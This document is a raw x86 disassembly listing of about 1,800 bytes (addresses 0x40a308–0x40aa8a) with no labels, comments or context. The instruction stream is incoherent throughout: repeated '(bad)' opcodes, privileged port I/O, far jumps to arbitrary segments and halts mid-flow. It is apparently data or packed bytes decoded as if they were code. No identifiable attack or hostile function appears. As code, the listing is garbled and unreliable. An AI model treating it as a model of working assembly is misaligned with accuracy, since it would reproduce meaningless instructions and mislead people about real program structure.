  40a308:	lods   al,BYTE PTR ds:[esi]
  40a309:	add    eax,0x98d4ffb8
  40a30e:	add    DWORD PTR [eax+eiz*8+0x63c211a6],0xffffff8f
  40a316:	dec    ecx
  40a317:	mov    edi,0x38c04ec0
  40a31c:	in     al,dx
  40a31d:	xlat   BYTE PTR ds:[ebx]
  40a31e:	or     dl,dl
  40a320:	jecxz  0x40a373
  40a322:	inc    edi
  40a323:	out    0x32,eax
  40a325:	mov    ebx,0xb44fdb4d
  40a32a:	pop    ds
  40a32b:	sbb    dh,dh
  40a32d:	jae    0x40a2ea
  40a32f:	aad    0x6c
  40a331:	or     al,0x98
  40a333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a334:	adc    dl,BYTE PTR ds:0xf27adbc3
  40a33a:	in     al,0x4b
  40a33c:	gs xor al,0x4
  40a33f:	fmul   DWORD PTR [eax-0x7abe411c]
  40a345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a346:	push   ss
  40a347:	(bad)  
  40a348:	inc    ecx
  40a349:	push   edi
  40a34a:	stc    
  40a34b:	sub    al,0xe1
  40a34d:	call   0x16d0:0x820d1ee5
  40a354:	in     eax,0x3e
  40a356:	cld    
  40a357:	mov    dl,0x15
  40a359:	iret   
  40a35a:	hlt    
  40a35b:	imul   edx,DWORD PTR [esi+0x5],0xffffffa9
  40a35f:	pop    eax
  40a360:	lods   al,BYTE PTR ds:[esi]
  40a361:	loope  0x40a352
  40a363:	push   ss
  40a364:	clc    
  40a365:	mov    ds:0x396e5112,eax
  40a36a:	test   BYTE PTR [ecx],dh
  40a36c:	retf   
  40a36d:	and    DWORD PTR [ebp+0x5aa7ed88],0xc261ac26
  40a377:	xor    DWORD PTR [eax+0x56f9ab5f],edi
  40a37d:	mov    edi,0xe5de93f0
  40a382:	test   cl,dh
  40a384:	jecxz  0x40a3f4
  40a386:	sbb    BYTE PTR [ecx+0x4c],bl
  40a389:	adc    DWORD PTR [edi],esi
  40a38b:	pop    ss
  40a38c:	fwait
  40a38d:	into   
  40a38e:	inc    ebx
  40a38f:	mov    ebp,0xaffb6b39
  40a394:	pushf  
  40a395:	call   DWORD PTR [edi-0x1]
  40a398:	mov    ds:0xf26db3bd,eax
  40a39d:	inc    edx
  40a39e:	sbb    al,0x34
  40a3a0:	mov    eax,ds:0x159b2d52
  40a3a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3a6:	js     0x40a32a
  40a3a8:	cwde   
  40a3a9:	cwde   
  40a3aa:	mov    cl,0x93
  40a3ac:	ins    BYTE PTR es:[edi],dx
  40a3ad:	mov    cl,0xd1
  40a3af:	ds jns 0x40a389
  40a3b2:	rcr    esp,1
  40a3b4:	inc    edi
  40a3b5:	xchg   ebp,eax
  40a3b6:	adc    edx,ebx
  40a3b8:	mov    ds:0xca4dd687,al
  40a3bd:	popa   
  40a3be:	fistp  DWORD PTR [edx-0x7c]
  40a3c1:	in     eax,0xe9
  40a3c3:	(bad)  
  40a3c4:	cmp    dl,BYTE PTR [ebp+0x4a]
  40a3c7:	pop    es
  40a3c8:	aaa    
  40a3c9:	fbstp  TBYTE PTR [esi-0x16]
  40a3cc:	adc    DWORD PTR [eax-0x26],0xffffff98
  40a3d0:	mov    eax,ds:0xfc7d5795
  40a3d5:	cmp    eax,0x3e58c4c5
  40a3da:	add    dl,al
  40a3dc:	je     0x40a43f
  40a3de:	adc    eax,0xf18d1007
  40a3e3:	clc    
  40a3e4:	call   0x9949:0xb032cfc6
  40a3eb:	or     bh,BYTE PTR ds:0x62cfd6d7
  40a3f1:	pop    ebp
  40a3f2:	cwde   
  40a3f3:	js     0x40a420
  40a3f5:	jnp    0x40a3b8
  40a3f7:	sub    ebp,ecx
  40a3f9:	mov    bl,0x74
  40a3fb:	in     al,dx
  40a3fc:	add    dl,bl
  40a3fe:	not    BYTE PTR [edi-0x63976cdd]
  40a404:	lock in al,dx
  40a406:	cs add bh,ah
  40a409:	js     0x40a3f0
  40a40b:	lods   al,BYTE PTR ds:[esi]
  40a40c:	cmp    al,0x61
  40a40e:	xor    bh,ch
  40a410:	push   ss
  40a411:	xlat   BYTE PTR ds:[ebx]
  40a412:	or     eax,0xa8a5adaf
  40a417:	dec    ebx
  40a418:	fxch   st(3)
  40a41a:	ret    0xc0f6
  40a41d:	jmp    0x40a41a
  40a41f:	idiv   DWORD PTR [eax]
  40a421:	sub    al,BYTE PTR gs:[ebp-0x4606dfb2]
  40a428:	jmpw   0x9c3f
  40a42c:	cmp    eax,DWORD PTR [esp+eiz*8-0x31308893]
  40a433:	push   0x463c5e2e
  40a438:	xor    edi,DWORD PTR [ebx]
  40a43a:	ror    DWORD PTR [esi],1
  40a43c:	jecxz  0x40a469
  40a43e:	sbb    BYTE PTR [ecx+0x27a98dd5],0x4e
  40a445:	pop    ebx
  40a446:	inc    ecx
  40a447:	adc    DWORD PTR [ecx+0x76],esp
  40a44a:	add    BYTE PTR [ecx+0x692d0155],dl
  40a450:	jge    0x40a3d9
  40a452:	std    
  40a453:	arpl   WORD PTR [edi+0x2b88c008],ax
  40a459:	mov    ah,0x1
  40a45b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a45c:	mov    ebx,eax
  40a45e:	ins    DWORD PTR es:[edi],dx
  40a45f:	shl    DWORD PTR [edx-0x542cf9de],cl
  40a465:	sub    al,0xef
  40a467:	push   ss
  40a468:	dec    esp
  40a469:	imul   esp,DWORD PTR [esi+0x5f],0x65
  40a46d:	nop
  40a46e:	iret   
  40a46f:	adc    eax,0xe41cbe4
  40a474:	add    al,0x26
  40a476:	mov    ah,0xd4
  40a478:	imul   ecx,edx,0xffffffba
  40a47b:	ins    BYTE PTR es:[edi],dx
  40a47c:	mul    BYTE PTR [esi-0x3]
  40a47f:	xor    al,0x5f
  40a481:	neg    BYTE PTR [ebx-0x7e841b90]
  40a487:	cmp    eax,0xe6e90ef
  40a48c:	xor    BYTE PTR [eax+0x290be58f],ah
  40a492:	jbe    0x40a4a3
  40a494:	pop    esp
  40a495:	pop    eax
  40a496:	pop    edi
  40a497:	test   BYTE PTR [esi+0x59],0x73
  40a49b:	jnp    0x40a4cd
  40a49d:	aam    0xfc
  40a49f:	rcl    BYTE PTR [ebx+0xf2495bd],cl
  40a4a5:	dec    edi
  40a4a6:	push   0xb2152406
  40a4ab:	xchg   edx,eax
  40a4ac:	inc    ebp
  40a4ad:	clc    
  40a4ae:	mov    esp,DWORD PTR [edx]
  40a4b0:	das    
  40a4b1:	ins    DWORD PTR es:[edi],dx
  40a4b2:	xor    eax,0xc658e1ed
  40a4b7:	sub    DWORD PTR [ebp-0x77],ecx
  40a4ba:	xchg   ebp,eax
  40a4bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4bc:	fdiv   QWORD PTR [edx+0x48c9f671]
  40a4c2:	dec    ecx
  40a4c3:	inc    esp
  40a4c4:	jns    0x40a457
  40a4c6:	nop
  40a4c7:	or     ecx,edx
  40a4c9:	mov    eax,0xaab49821
  40a4ce:	adc    edi,0xc69bfa3a
  40a4d4:	sub    eax,0xe8ccc52a
  40a4d9:	popa   
  40a4da:	and    BYTE PTR [edi-0x5d],bh
  40a4dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4de:	pop    edi
  40a4df:	or     BYTE PTR [edi+eax*2],dh
  40a4e2:	xlat   BYTE PTR ds:[ebx]
  40a4e3:	fwait
  40a4e4:	push   esp
  40a4e5:	cmp    DWORD PTR [ecx],0x5587db93
  40a4eb:	imul   ebp,DWORD PTR [esi+0x26],0xfffffff6
  40a4ef:	pop    esp
  40a4f0:	imul   edi,DWORD PTR [ebp+ebp*8+0x103262f1],0x657fa328
  40a4fb:	lea    ecx,[ecx]
  40a4fd:	jg     0x40a502
  40a4ff:	or     al,0xad
  40a501:	push   ebp
  40a502:	out    dx,eax
  40a503:	ret    0x1167
  40a506:	test   DWORD PTR gs:[ebp+0x59],0x2e7afb34
  40a50e:	(bad)  
  40a50f:	pop    esi
  40a510:	push   ecx
  40a511:	sub    BYTE PTR [edx],0xea
  40a514:	repz sbb eax,0x22ec6027
  40a51a:	add    al,0xb2
  40a51c:	not    BYTE PTR [edi+edi*2]
  40a51f:	out    0x8e,al
  40a521:	push   esp
  40a522:	inc    ecx
  40a523:	stos   DWORD PTR es:[edi],eax
  40a524:	push   esi
  40a525:	enter  0x4721,0xa0
  40a529:	in     al,dx
  40a52a:	cmp    DWORD PTR [ebx],esp
  40a52c:	mov    DWORD PTR [ecx-0x70d0aa13],edi
  40a532:	jns    0x40a59a
  40a534:	cmp    ecx,DWORD PTR [ebx+0x70]
  40a537:	mov    bl,0x3a
  40a539:	mov    cl,0x85
  40a53b:	xchg   edi,eax
  40a53c:	sub    DWORD PTR [ebx+0x5930ed33],0x9d7f1887
  40a546:	pop    esi
  40a547:	and    DWORD PTR [edx+eax*8],0x73
  40a54b:	shufps xmm4,XMMWORD PTR [bx-0x7f18],0x18
  40a552:	fisubr DWORD PTR [edx]
  40a554:	xchg   esp,eax
  40a555:	xor    edi,ebp
  40a557:	fstp   QWORD PTR [edx-0x6d]
  40a55a:	inc    ecx
  40a55b:	push   es
  40a55c:	sahf   
  40a55d:	or     ebx,0x4cb10f5d
  40a563:	add    ebp,DWORD PTR [esi+0x7c]
  40a566:	leave  
  40a567:	sahf   
  40a568:	rcl    ah,1
  40a56a:	pop    ds
  40a56b:	repz shr bl,cl
  40a56e:	adc    esi,DWORD PTR [ecx+0x1a69f47c]
  40a574:	sbb    ebx,DWORD PTR [esi+0x9]
  40a577:	jg     0x40a56b
  40a579:	ret    
  40a57a:	adc    dh,ch
  40a57c:	push   eax
  40a57d:	xor    esi,DWORD PTR [esi-0x5bda2508]
  40a583:	push   edx
  40a584:	push   ebx
  40a585:	push   esi
  40a586:	retf   0xbb47
  40a589:	push   ebp
  40a58a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a58b:	mov    eax,ds:0x8d00df45
  40a590:	scas   eax,DWORD PTR es:[edi]
  40a591:	cmp    BYTE PTR [ebp-0x4d],bl
  40a594:	adc    esi,DWORD PTR [esi-0x5a]
  40a597:	mov    ebp,ebp
  40a599:	or     edx,ebp
  40a59b:	addr16 or esi,ecx
  40a59e:	mov    ebx,fs
  40a5a0:	pop    edi
  40a5a1:	xchg   edi,eax
  40a5a2:	inc    ebp
  40a5a3:	mov    esp,0xe2ef3899
  40a5a8:	shl    BYTE PTR [edx],cl
  40a5aa:	sbb    DWORD PTR [edx+esi*2],0xa7db91c5
  40a5b1:	shl    DWORD PTR [ecx+esi*4+0x35b923cd],1
  40a5b8:	dec    edx
  40a5b9:	pop    ebp
  40a5ba:	shl    DWORD PTR [eax],0xb2
  40a5bd:	fucom  st(4)
  40a5bf:	(bad)  
  40a5c1:	lods   al,BYTE PTR ds:[esi]
  40a5c2:	es push ebp
  40a5c4:	pop    esp
  40a5c5:	push   ebp
  40a5c6:	jbe    0x40a620
  40a5c8:	xlat   BYTE PTR ds:[ebx]
  40a5c9:	mov    cl,BYTE PTR [ecx+eax*1]
  40a5cc:	add    BYTE PTR [ecx+edi*4],dh
  40a5cf:	xor    BYTE PTR [eax-0x6aff8657],al
  40a5d5:	pop    ss
  40a5d6:	shl    bh,cl
  40a5d8:	xchg   esi,eax
  40a5d9:	add    esi,DWORD PTR [eax]
  40a5db:	jo     0x40a62e
  40a5dd:	and    cl,bl
  40a5df:	pushf  
  40a5e0:	adc    al,0x29
  40a5e2:	mov    ds:0x152408e,al
  40a5e7:	fs inc esp
  40a5e9:	mov    DWORD PTR [ebp+0x48],ecx
  40a5ec:	inc    ebp
  40a5ed:	(bad)  
  40a5ee:	js     0x40a653
  40a5f0:	das    
  40a5f1:	sub    bl,0xc3
  40a5f4:	push   cs
  40a5f5:	push   ebp
  40a5f6:	repz addr16 stc 
  40a5f9:	adc    DWORD PTR [esi+eax*2],edi
  40a5fc:	shr    DWORD PTR [edx-0x1798a9d4],cl
  40a602:	inc    esp
  40a603:	mov    esp,0x5cb806e6
  40a608:	aas    
  40a609:	aam    0x2
  40a60b:	lahf   
  40a60c:	mov    ebp,0x9f38bc67
  40a611:	aas    
  40a612:	scas   eax,DWORD PTR es:[edi]
  40a613:	cmc    
  40a614:	out    0xa9,eax
  40a616:	in     al,0xfe
  40a618:	sar    edx,0xee
  40a61b:	(bad)  
  40a61c:	arpl   di,dx
  40a61e:	or     bh,bh
  40a620:	or     eax,0x62265404
  40a625:	arpl   WORD PTR [ebx+0x7b],di
  40a628:	stc    
  40a629:	mov    esp,0x1d09c33f
  40a62e:	not    DWORD PTR [ebp-0x3e3e6f52]
  40a634:	ret    0x92c0
  40a637:	sub    DWORD PTR [edx],ebp
  40a639:	int3   
  40a63a:	fnstcw WORD PTR [ecx-0x57]
  40a63d:	mov    edi,0xad6776d0
  40a642:	ret    0x411
  40a645:	dec    ecx
  40a646:	xor    DWORD PTR ds:0x548ce0eb,0xa30ed325
  40a650:	in     al,0xc9
  40a652:	dec    ebx
  40a653:	adc    cl,0x8d
  40a656:	jle    0x40a5e1
  40a658:	in     eax,dx
  40a659:	iret   
  40a65a:	xchg   ebx,eax
  40a65b:	test   ax,0x6c8c
  40a65f:	cld    
  40a660:	sahf   
  40a661:	pop    ebp
  40a662:	nop
  40a663:	out    0x3,eax
  40a665:	xor    ebp,0x43eb26ff
  40a66b:	mov    esi,cs
  40a66d:	inc    esp
  40a66e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a66f:	or     BYTE PTR [ebx+0x60ad702a],al
  40a675:	scas   eax,DWORD PTR es:[edi]
  40a676:	push   0x6054cd94
  40a67b:	(bad)  
  40a67c:	pushf  
  40a67d:	jmp    0x40a6a2
  40a67f:	adc    al,0x5b
  40a681:	mov    WORD PTR [ecx+0x40],cs
  40a684:	xchg   ebp,eax
  40a685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a686:	sub    ecx,esp
  40a688:	aaa    
  40a689:	loope  0x40a6a8
  40a68b:	mov    bh,0xb5
  40a68d:	hlt    
  40a68e:	pop    ecx
  40a68f:	adc    ebp,esp
  40a691:	cmc    
  40a692:	ss mov ebp,ebp
  40a695:	mov    edi,0x78e5c905
  40a69a:	inc    edi
  40a69b:	add    ebp,ebp
  40a69d:	xchg   DWORD PTR [esi+ebx*8-0xe],edx
  40a6a1:	push   cs
  40a6a2:	int    0xec
  40a6a4:	repz fidivr DWORD PTR [ecx+0x0]
  40a6a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6a9:	inc    esi
  40a6aa:	stc    
  40a6ab:	push   0xddc31a7d
  40a6b0:	sub    al,0x55
  40a6b2:	xchg   esp,eax
  40a6b3:	int3   
  40a6b4:	pop    ebx
  40a6b5:	lock rol BYTE PTR [esi+0x2fb1bcdc],cl
  40a6bc:	mov    gs,WORD PTR [ebx+0x3fa858a3]
  40a6c2:	(bad)
  40a6c7:	inc    eax
  40a6c8:	xchg   ecx,eax
  40a6c9:	cmp    DWORD PTR [ebp-0x3a],ebx
  40a6cc:	xchg   esi,eax
  40a6cd:	cmp    BYTE PTR [ecx+0x5cb4b003],bh
  40a6d3:	fisttp WORD PTR [edx]
  40a6d5:	inc    edx
  40a6d6:	mov    ebp,0x1ae9a38a
  40a6db:	adc    eax,0xf6a26a50
  40a6e0:	ins    DWORD PTR es:[edi],dx
  40a6e1:	clc    
  40a6e2:	aad    0x77
  40a6e4:	les    ebx,FWORD PTR [edi]
  40a6e6:	sbb    BYTE PTR [esi-0x62],bl
  40a6e9:	int3   
  40a6ea:	dec    DWORD PTR [ebx-0xa495b12]
  40a6f0:	xchg   DWORD PTR [ebp+0x3f],esp
  40a6f3:	add    edx,eax
  40a6f5:	and    esp,DWORD PTR [edx]
  40a6f7:	shl    DWORD PTR [edi],0x8c
  40a6fa:	out    0x4b,eax
  40a6fc:	push   ebp
  40a6fd:	pop    eax
  40a6fe:	data16 aas 
  40a700:	ins    BYTE PTR es:[edi],dx
  40a701:	mov    al,ds:0x9e98c69b
  40a706:	ret    
  40a707:	push   edi
  40a708:	aad    0x79
  40a70a:	loop   0x40a6ee
  40a70c:	inc    esp
  40a70d:	jl     0x40a757
  40a70f:	pop    ecx
  40a710:	add    ax,0xef5
  40a714:	rcl    BYTE PTR [ebx],0x8a
  40a717:	pushf  
  40a718:	push   esi
  40a719:	sub    al,0x92
  40a71b:	loope  0x40a6fe
  40a71d:	or     dl,BYTE PTR [eax-0x48]
  40a720:	push   ebp
  40a721:	dec    edx
  40a722:	ds push esp
  40a724:	rol    BYTE PTR [esi-0x74],1
  40a727:	mov    al,ds:0x88fc2a2d
  40a72c:	mov    DWORD PTR [edi],0x3014e6a9
  40a732:	iret   
  40a733:	test   eax,0x7270332c
  40a738:	sub    al,BYTE PTR [ebp*1-0x1339974c]
  40a73f:	out    dx,eax
  40a740:	sbb    BYTE PTR [eax+0x3e],0xc1
  40a744:	inc    ebp
  40a745:	inc    esi
  40a746:	jge    0x40a76e
  40a748:	loopne 0x40a78e
  40a74a:	clc    
  40a74b:	repnz dec edi
  40a74d:	call   0x6895b7eb
  40a752:	push   0x67
  40a754:	repz mov eax,edi
  40a757:	jnp    0x40a773
  40a759:	mov    cl,0xda
  40a75b:	mov    DWORD PTR [edi-0x3aa3f9da],ebx
  40a761:	test   DWORD PTR [esi],edx
  40a763:	rcl    BYTE PTR [ebp-0x7f3718c1],0x54
  40a76a:	pop    ebp
  40a76b:	adc    DWORD PTR [edx+eiz*2],0xe291ba3d
  40a772:	cmc    
  40a773:	cmp    DWORD PTR [ecx-0x24d16340],esp
  40a779:	cdq    
  40a77a:	inc    ebp
  40a77b:	add    esi,edi
  40a77d:	shl    ah,cl
  40a77f:	in     eax,0xcf
  40a781:	mov    ch,0xc8
  40a783:	add    ebp,DWORD PTR [ebx-0x47]
  40a786:	sub    al,0xfc
  40a788:	leave  
  40a789:	fnsave [ecx]
  40a78b:	jmp    0xedcd24fa
  40a790:	mov    ebp,0x9bf6d937
  40a795:	add    ebp,ebx
  40a797:	(bad)  
  40a798:	ror    DWORD PTR [ebp-0x657b5e59],cl
  40a79e:	cmp    al,0x72
  40a7a0:	retf   
  40a7a1:	ror    BYTE PTR [edx],1
  40a7a3:	sbb    eax,0xc2a6b03e
  40a7a8:	mov    eax,0x7863f4cd
  40a7ad:	lea    eax,[ebp-0x3c712f8e]
  40a7b3:	mov    ebp,0xe10367cc
  40a7b8:	add    al,al
  40a7ba:	pop    esi
  40a7bb:	inc    esp
  40a7bc:	jp     0x40a7d8
  40a7be:	adc    al,BYTE PTR [esi+eiz*1]
  40a7c1:	push   ebp
  40a7c2:	inc    ebp
  40a7c3:	pop    esi
  40a7c4:	out    dx,eax
  40a7c5:	inc    ecx
  40a7c6:	and    bh,al
  40a7c8:	pop    ds
  40a7c9:	add    al,BYTE PTR [eax+0x2a156f6f]
  40a7cf:	or     eax,0xcda27a6
  40a7d4:	leave  
  40a7d5:	or     eax,0x1e43c779
  40a7da:	pop    ebp
  40a7db:	jmp    0x862554a0
  40a7e0:	inc    ecx
  40a7e1:	mov    ds:0x4ccabdac,eax
  40a7e6:	or     bh,BYTE PTR ds:0xfc3b82a0
  40a7ec:	(bad)  
  40a7ed:	sbb    BYTE PTR [ecx-0x22],cl
  40a7f0:	mov    ds:0x9ad12cfe,eax
  40a7f5:	push   es
  40a7f6:	xor    al,0x41
  40a7f8:	or     ecx,0x4e0ebcf7
  40a7fe:	mov    cl,0x8
  40a800:	outs   dx,BYTE PTR fs:[esi]
  40a802:	adc    DWORD PTR [edi],eax
  40a804:	sbb    esp,0xffffffc4
  40a807:	mov    eax,0x46b7a23
  40a80c:	adc    BYTE PTR [esi-0x3d],bh
  40a80f:	ror    BYTE PTR [edx+0x16dd7339],0x5f
  40a816:	xchg   ecx,eax
  40a817:	mov    ds:0xd7b1b587,al
  40a81c:	add    eax,0x73a10f12
  40a821:	jae    0x40a868
  40a823:	xlat   BYTE PTR ds:[ebx]
  40a824:	jecxz  0x40a898
  40a826:	xchg   edi,eax
  40a827:	mov    edi,0xd1e042c1
  40a82c:	clc    
  40a82d:	xlat   BYTE PTR ds:[ebx]
  40a82e:	stos   BYTE PTR es:[edi],al
  40a82f:	outs   dx,DWORD PTR ds:[esi]
  40a830:	arpl   sp,dx
  40a832:	ret    0xe4e7
  40a835:	adc    DWORD PTR [ebp+ebx*4-0x3dfd6600],ebp
  40a83c:	mov    DWORD PTR [eax],edx
  40a83e:	pop    edi
  40a83f:	pop    ecx
  40a840:	xchg   ebp,eax
  40a841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a842:	jle    0x40a7d1
  40a844:	test   eax,0x5e74f9dd
  40a849:	and    al,0x71
  40a84b:	xchg   ebp,eax
  40a84c:	and    eax,0x57058579
  40a851:	mov    bl,0xf
  40a853:	xor    DWORD PTR [ebx-0x4e60b661],0x483737db
  40a85d:	loope  0x40a89a
  40a85f:	jmp    0x40a8ab
  40a861:	inc    eax
  40a862:	retf   0x93df
  40a865:	add    esi,DWORD PTR [edx-0x4b]
  40a868:	jmp    0x40a8b3
  40a86a:	xchg   ebp,eax
  40a86b:	(bad)  
  40a86d:	stos   BYTE PTR es:[edi],al
  40a86e:	xchg   esi,eax
  40a86f:	test   al,0xcd
  40a871:	add    BYTE PTR [eax],0xbd
  40a874:	out    dx,al
  40a875:	jmp    0x99ad:0xc2527a15
  40a87c:	push   edx
  40a87d:	xchg   edi,eax
  40a87e:	in     al,0xac
  40a880:	nop
  40a881:	jmp    0xa002:0xc38004a9
  40a888:	push   edi
  40a889:	push   edi
  40a88a:	out    dx,eax
  40a88b:	sbb    esi,DWORD PTR [edi]
  40a88d:	mov    ch,0x7e
  40a88f:	(bad)  
  40a891:	sub    BYTE PTR [ebp+eiz*1+0x4d],0x11
  40a896:	pusha  
  40a897:	jle    0x40a8df
  40a899:	popf   
  40a89a:	xchg   esp,eax
  40a89b:	icebp  
  40a89c:	adc    BYTE PTR [ecx-0x67],bl
  40a89f:	sar    DWORD PTR [eax+0x236cb8d],0x83
  40a8a6:	in     al,dx
  40a8a7:	lods   eax,DWORD PTR ds:[esi]
  40a8a8:	add    eax,0xcea96964
  40a8ad:	ds mov cl,0x57
  40a8b0:	add    BYTE PTR [esi+0x4c],cl
  40a8b3:	in     eax,0xe6
  40a8b5:	(bad)  [edi-0x31a221c0]
  40a8bb:	dec    esp
  40a8bc:	sbb    dl,BYTE PTR [esi+0x26]
  40a8bf:	ins    BYTE PTR es:[edi],dx
  40a8c0:	out    0x16,al
  40a8c2:	jnp    0x40a91e
  40a8c4:	aaa    
  40a8c5:	addr16 fwait
  40a8c7:	jno    0x40a872
  40a8c9:	in     eax,dx
  40a8ca:	mov    ds:0x486a18f7,eax
  40a8cf:	dec    ebp
  40a8d0:	mov    dl,BYTE PTR [ebp+0x30bb8877]
  40a8d6:	push   ebx
  40a8d7:	dec    ecx
  40a8d8:	add    eax,0x3209eec6
  40a8dd:	in     eax,0xb7
  40a8df:	mov    eax,ds:0xb4189879
  40a8e4:	inc    ebp
  40a8e5:	xchg   ebx,eax
  40a8e6:	hlt    
  40a8e7:	cdq    
  40a8e8:	mov    ch,0xb9
  40a8ea:	add    al,BYTE PTR [esi-0x57697f69]
  40a8f0:	and    dh,0x79
  40a8f3:	sub    ebp,DWORD PTR [ecx-0x6fa3b3cb]
  40a8f9:	and    al,0xd
  40a8fb:	mov    esp,0xa729d2d7
  40a900:	mov    al,ds:0xae4392bb
  40a905:	cmp    DWORD PTR [ecx-0x39ec7bd1],ebp
  40a90b:	inc    edx
  40a90c:	mov    WORD PTR [ecx+0x224e5f26],ss
  40a912:	rcl    DWORD PTR [edx-0x51],0x2b
  40a916:	ss or  esi,ebp
  40a919:	lds    edx,FWORD PTR [ecx]
  40a91b:	icebp  
  40a91c:	std    
  40a91d:	repnz cmp BYTE PTR [esi],ch
  40a920:	cli    
  40a921:	mov    WORD PTR [eax],ds
  40a923:	dec    ebx
  40a924:	jmp    0xd865:0xe744e40f
  40a92b:	xchg   ecx,eax
  40a92c:	sub    al,dh
  40a92e:	out    dx,al
  40a92f:	cmp    dl,ch
  40a931:	in     al,dx
  40a932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a933:	push   edi
  40a934:	and    al,0x8
  40a936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a937:	dec    edx
  40a938:	lahf   
  40a939:	arpl   WORD PTR [ebp-0x4b30d694],ax
  40a93f:	push   ebx
  40a940:	imul   eax,esi,0x474ad66a
  40a946:	push   esi
  40a947:	gs in  al,dx
  40a949:	mov    dl,BYTE PTR [ebx+ebp*2]
  40a94c:	or     eax,0xa94fe0c4
  40a951:	in     eax,0x39
  40a953:	mov    WORD PTR [edi+0x74],gs
  40a956:	int3   
  40a957:	fwait
  40a958:	imul   ecx,DWORD PTR [ecx-0x4e706ead],0x48
  40a95f:	sbb    al,0x71
  40a961:	pop    esp
  40a962:	xchg   edx,eax
  40a963:	(bad)  
  40a964:	xor    bh,dh
  40a966:	dec    edx
  40a967:	out    dx,eax
  40a968:	popf   
  40a969:	stc    
  40a96a:	inc    ebx
  40a96b:	jmp    0x40a9d5
  40a96d:	bswap  esi
  40a96f:	xchg   DWORD PTR ds:0x691f7e4f,ebx
  40a975:	sar    cl,1
  40a977:	pop    ecx
  40a978:	ret    0x1655
  40a97b:	jne    0x40a9f0
  40a97d:	hlt    
  40a97e:	mov    eax,ds:0x8f83c2fa
  40a983:	jb     0x40a9c1
  40a985:	iret   
  40a986:	pop    ebx
  40a987:	aad    0xb7
  40a989:	dec    ebp
  40a98a:	or     dl,ah
  40a98c:	mov    al,ds:0x470bdad3
  40a991:	pop    ecx
  40a992:	dec    ebx
  40a993:	inc    esp
  40a994:	mov    edx,0x8386d87e
  40a999:	sub    esi,DWORD PTR [esi+eax*2-0x5645df94]
  40a9a0:	mov    ds:0xa0ee8054,al
  40a9a5:	fcomp  QWORD PTR [eax-0x3c51745]
  40a9ab:	pop    ebx
  40a9ac:	cmp    eax,0x1b21b649
  40a9b1:	out    0x6,al
  40a9b3:	cli    
  40a9b4:	xor    eax,0xc8d8dfa
  40a9b9:	and    BYTE PTR [eax-0x72c3c590],0xa9
  40a9c0:	arpl   WORD PTR [esi-0x76],bp
  40a9c3:	arpl   WORD PTR [eax-0x2dbe367b],cx
  40a9c9:	gs (bad) 
  40a9cb:	jns    0x40aa17
  40a9cd:	imul   ebp,DWORD PTR [ecx+0x1d],0x37
  40a9d1:	inc    ecx
  40a9d2:	(bad)  
  40a9d4:	xor    bl,dh
  40a9d6:	shl    DWORD PTR [edi-0x2832a669],1
  40a9dc:	cmp    BYTE PTR [ecx+0x6f072cf9],ah
  40a9e2:	test   BYTE PTR [eax-0x29ed102b],al
  40a9e8:	jae    0x40aa33
  40a9ea:	daa    
  40a9eb:	sbb    ecx,DWORD PTR [ebx]
  40a9ed:	dec    ecx
  40a9ee:	ins    BYTE PTR es:[edi],dx
  40a9ef:	mov    bh,al
  40a9f1:	dec    esi
  40a9f2:	jge    0x40a9e7
  40a9f4:	push   ds
  40a9f5:	ret    0x9e92
  40a9f8:	aaa    
  40a9f9:	ins    DWORD PTR es:[edi],dx
  40a9fa:	in     eax,0x1
  40a9fc:	xorps  xmm0,XMMWORD PTR [eax]
  40a9ff:	adc    esi,DWORD PTR [edx]
  40aa01:	icebp  
  40aa02:	iret   
  40aa03:	mul    DWORD PTR [ecx+0x9]
  40aa06:	and    dl,dh
  40aa08:	jle    0x40a9ad
  40aa0a:	stc    
  40aa0b:	iret   
  40aa0c:	sub    esi,DWORD PTR ss:[eax+0x3271f447]
  40aa13:	fwait
  40aa14:	xor    BYTE PTR [eax+0x5],0xe6
  40aa18:	xchg   ebp,eax
  40aa19:	or     eax,0x1b7bde4a
  40aa1e:	ret    
  40aa1f:	in     eax,0x2c
  40aa21:	js     0x40aa35
  40aa23:	add    BYTE PTR [esi-0x7b0d8407],0x48
  40aa2a:	idiv   DWORD PTR [edi+eiz*2-0x71024fdc]
  40aa31:	ss and al,0x27
  40aa34:	mov    ch,0x95
  40aa36:	xchg   edx,eax
  40aa37:	sbb    al,0x2c
  40aa39:	jge    0x40aa08
  40aa3b:	sbb    bh,dl
  40aa3d:	(bad)  
  40aa3e:	sti    
  40aa3f:	lods   al,BYTE PTR ds:[esi]
  40aa40:	js     0x40aa85
  40aa42:	repz rcl DWORD PTR [ebx+0x68],1
  40aa46:	sub    eax,0xd9af4d36
  40aa4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa4c:	pop    esi
  40aa4d:	imul   eax,DWORD PTR [ecx],0x82e4d364
  40aa53:	dec    esi
  40aa54:	addr16 push esi
  40aa56:	lods   eax,DWORD PTR ds:[esi]
  40aa57:	mov    bh,0x97
  40aa59:	loop   0x40aabd
  40aa5b:	retf   0x4be9
  40aa5e:	test   DWORD PTR [esi-0xa61589],esp
  40aa64:	ret    
  40aa65:	adc    esi,esi
  40aa67:	sub    ebx,0x58
  40aa6a:	push   edx
  40aa6b:	xchg   esi,eax
  40aa6c:	or     BYTE PTR [esi+0x58c25e0e],0xd0
  40aa73:	and    DWORD PTR [ebx+0x12],0xffffffdb
  40aa77:	jecxz  0x40aa11
  40aa79:	nop
  40aa7a:	pop    ds
  40aa7b:	scas   al,BYTE PTR es:[edi]
  40aa7c:	into   
  40aa7d:	pop    ss
  40aa7e:	xor    cl,bl
  40aa80:	lea    eax,[edx]
  40aa82:	cmp    DWORD PTR [ebx+0x56e42471],ebp
  40aa88:	and    DWORD PTR [ecx],edx
  40aa8a:	mov    cl,0x77
